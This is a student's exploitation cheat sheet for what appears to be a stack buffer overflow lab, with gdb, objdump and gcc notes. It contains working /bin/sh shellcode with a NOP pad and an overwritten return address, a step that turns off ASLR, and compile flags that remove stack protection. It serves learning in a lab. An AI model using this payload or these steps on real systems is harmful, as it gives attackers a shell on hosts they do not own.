# A sheet for later use

## exec with python
```
./ans_check5 $(python -c "print '\xAA'*N + '\xef\xbe\xad\xde'")
```

## env execute
+ This is needed when synchronizing address between command line execution and gdb execution. 
```
# command line execution
env -i PWD="/home/seed/stack_addresses" SHELL="/bin/bash" SHLVL=0 /home/seed/stack_addresses/ans_check5 <param>

# gdb execution
env -i PWD="/home/seed/labs/lab3/stack_addresses" SHELL="/bin/bash" SHLVL=0 gdb /home/seed/523/labs/lab3/stack_addresses/ans_check5
unset env LINES
unset env COLUMNS
break 
run $( python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + '\x90'*22 + '\x8e\xfd\xff\xbf'")
x/32xw $esp
c
x/32xw $esp
```


## How to find the return address of a function
+ Both are working
+ gdb : Exec the gdb and then disass 'a function name which is calling the function you target'. 
And the next address of the function call should be the return address.
+ objdump : Exec the objdump and grep the 'the function name you want to find'. 
  And the next address of the function call should be the return address.
  
## gcc
```
gcc -g -z execstack -fno-stack-protector ans_check5.c -o ans_check5

-fno-stack-protector : disables stack protection. Asks the compiler not to add the StackGuard protection.
-g : default debug information
-o : set output file name
-z execstack : marks the stack as executable
```

## objdump
```
objdump -D ans_check5 | grep -B 1 exit

# grep -B 1 exit:  -B 1 : exit 찾고 그것만 보여주지 말고 그 전에 한줄도 보여주란 옵션
# grep -A 1 exit:  -A 1 : exit 찾고 그것만 보여주지 말고 그 에 한줄도 보여주란 옵션
```


## To disable ASLR
+ 0 (disabled), or 1 or 2(enabled)
```
cat /proc/sys/kernel/randomize_va_space # Write down val
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

## gdb example
```
# run gdb quietly
gdb -q <program>

# set break point and run
set args “--help”
break __libc_start_main
break *0x08048534 : Using address directly, type *
run

# disassemble function. To find out the address of the function
disass <function name>

# Investigate memory
frame
bt
info frame
info registers
x /16xw $esp
set *{start} = 0x20554c42

x/s ans_buf
x/xw &ans_flag
x/32xw $esp
```


## gdb options
```
-q : 시작시 설명문구 없이 시작
list <line number> : Show the code
break <line nuber> : Set a break point
run <param> : keep executing. <param> is optional
c : after breaking, keep executing
dissass <function name> : Shows the disassembled code and it's memory address
bt : backtrace
set args <param> : Set run param
set <address> = <value> : Set <value> at the <address>\
i b : break information 보기
i r esp : information register esp
```
